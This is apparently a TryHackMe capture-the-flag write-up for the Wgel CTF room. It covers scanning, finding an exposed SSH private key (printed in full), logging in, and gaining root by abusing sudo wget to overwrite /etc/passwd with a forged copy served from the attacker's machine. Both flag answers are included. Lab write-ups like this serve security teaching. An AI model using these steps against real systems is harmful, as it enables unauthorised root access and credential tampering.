# TryHackMe [Wgel CTF](https://www.tryhackme.com/room/wgelctf)
### References
* Hammond, J. (2020). TryHackMe! Wget for Privilege Escalation [YouTube Video]. In YouTube. https://youtu.be/fq2EKJ3-fp8
## Reconnaissance
* `nmap`:
```bash
$ nmap -vv -sV -sC 10.10.100.212
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-08 23:12 AEST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:12
Completed NSE at 23:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:12
Completed NSE at 23:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:12
Completed NSE at 23:12, 0.00s elapsed
Initiating Ping Scan at 23:12
Scanning 10.10.100.212 [2 ports]
Completed Ping Scan at 23:12, 0.28s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:12
Completed Parallel DNS resolution of 1 host. at 23:12, 0.07s elapsed
Initiating Connect Scan at 23:12
Scanning 10.10.100.212 [1000 ports]
Discovered open port 22/tcp on 10.10.100.212
Discovered open port 80/tcp on 10.10.100.212
Increasing send delay for 10.10.100.212 from 0 to 5 due to 73 out of 241 dropped probes since last increase.
Increasing send delay for 10.10.100.212 from 5 to 10 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.100.212 from 10 to 20 due to max_successful_tryno increase to 5
Completed Connect Scan at 23:12, 41.64s elapsed (1000 total ports)
Initiating Service scan at 23:12
Scanning 2 services on 10.10.100.212
Completed Service scan at 23:12, 6.64s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.100.212.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:12
Completed NSE at 23:13, 9.18s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:13
Completed NSE at 23:13, 1.14s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:13
Completed NSE at 23:13, 0.00s elapsed
Nmap scan report for 10.10.100.212
Host is up, received conn-refused (0.28s latency).
Scanned at 2021-05-08 23:12:11 AEST for 59s
Not shown: 998 closed ports
Reason: 998 conn-refused
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR+idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK+2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ+jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8=
|   256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt+ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:13
Completed NSE at 23:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:13
Completed NSE at 23:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:13
Completed NSE at 23:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.26 seconds
```
* `gobuster`:
```bash
$ gobuster dir -u http://10.10.100.212/ -w $(pwd)/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.100.212/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/applegamer22/Documents/AppleGamer22/TryHackMe/Wgel_CTF/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/08 23:18:43 Starting gobuster in directory enumeration mode
===============================================================
/sitemap              (Status: 301) [Size: 316] [--> http://10.10.100.212/sitemap/]
$ gobuster dir -u http://10.10.100.212/sitemap -w $(pwd)/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.100.212/sitemap
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/applegamer22/Documents/AppleGamer22/TryHackMe/Wgel_CTF/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/08 23:18:09 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.ssh                 (Status: 301) [Size: 321] [--> http://10.10.100.212/sitemap/.ssh/]
```
## User flag
1. An HTML comment from `http://10.10.100.212`:
```html
<!-- Jessie don't forget to udate the webiste -->
```
2. Use the SSH private key from `http://10.10.100.212/sitemap/.ssh/id_rsa`:
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----
```
3. Access the server's shell:
```bash
$ chmod 600 id_rsa
$ ssh -i id_rsa jessie@10.10.100.212
jessie@CorpOne:~$ find | grep flag
./Documents/user_flag.txt
jessie@CorpOne:~$ cat Documents/user_flag.txt 
057c67131c3d5e42dd5cd3075b198ff6
```

**Answer**: `057c67131c3d5e42dd5cd3075b198ff6`
## Root flag
1. On the machine, extract the `/etc/passwd` file to your machine:
```bash
jessie@CorpOne:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
jessie:x:1000:1000:jessie,,,:/home/jessie:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
```
2. Choose your `root` password, put in this [Python script](passwd.py):
```python
from crypt import crypt
print(crypt("<YOUR_PASSWORD>"))
```
3. Replace the `x` in the first line of your `/etc/passwd` copy with your password's hash.
4. On your machine, run an HTTP server in the same folder as your `/etc/passwd` copy.
5. On the server, use `wget` to override the original `/etc/passwd`.
```
jessie@CorpOne:~$ sudo wget http://10.4.32.172/passwd -O /etc/passwd
--2021-05-08 16:33:45--  http://10.4.32.172/passwd
Connecting to 10.4.32.172:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2397 (2,3K) [application/octet-stream]
Saving to: ‘/etc/passwd’

/etc/passwd                   100%[===============================================>]   2,34K  --.-KB/s    in 0s      

2021-05-08 16:33:45 (227 MB/s) - ‘/etc/passwd’ saved [2397/2397]
```
6. Use your `root` password to switch to an Administrator context.
```
jessie@CorpOne:~$ su root
Password: <YOUR_PASSWORD>
root@CorpOne:/home/jessie# cd /root
root@CorpOne:~# ls
root_flag.txt
root@CorpOne:~# cat root_flag.txt 
b1b968b37519ad1daa6408188649263d
```
**Answer**: `b1b968b37519ad1daa6408188649263d`